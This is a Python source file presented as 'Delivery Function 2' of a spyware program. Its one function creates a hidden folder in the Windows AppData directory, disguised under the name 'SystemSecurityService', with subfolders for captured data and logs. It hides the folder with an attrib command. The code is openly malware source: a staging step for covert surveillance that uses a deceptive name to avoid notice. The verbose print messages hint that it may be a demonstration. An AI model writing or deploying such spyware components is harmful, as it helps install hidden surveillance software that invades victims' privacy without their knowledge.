"""
Delivery Function 2: Install Spyware Components
Creates hidden folder and installs spyware components in AppData
"""

import os

def install_spyware():
    """
    Install spyware components to hidden system folder
    Returns: Path to spyware folder or None if failed
    """
    print("[Spyware] Function 2: Installing spyware components...")
    
    # Create spyware folder path in AppData
    appdata = os.getenv('APPDATA')
    spyware_folder = os.path.join(appdata, "SystemSecurityService")
    
    try:
        # Create folder structure for spyware
        if not os.path.exists(spyware_folder):
            os.makedirs(spyware_folder)
            
            # Create subfolders for captured data
            data_folder = os.path.join(spyware_folder, "captured_data")
            logs_folder = os.path.join(spyware_folder, "logs")
            os.makedirs(data_folder, exist_ok=True)
            os.makedirs(logs_folder, exist_ok=True)
            
            # Set folder as hidden (Windows)
            os.system(f'attrib +h "{spyware_folder}"')
            
            print(f"[Spyware] Installed spyware to: {spyware_folder}")
            print(f"[Spyware] Data capture folder: {data_folder}")
            return spyware_folder
        else:
            print(f"[Spyware] Spyware folder already exists: {spyware_folder}")
            return spyware_folder
    except Exception as e:
        print(f"[Spyware] Error installing spyware: {e}")
        return None
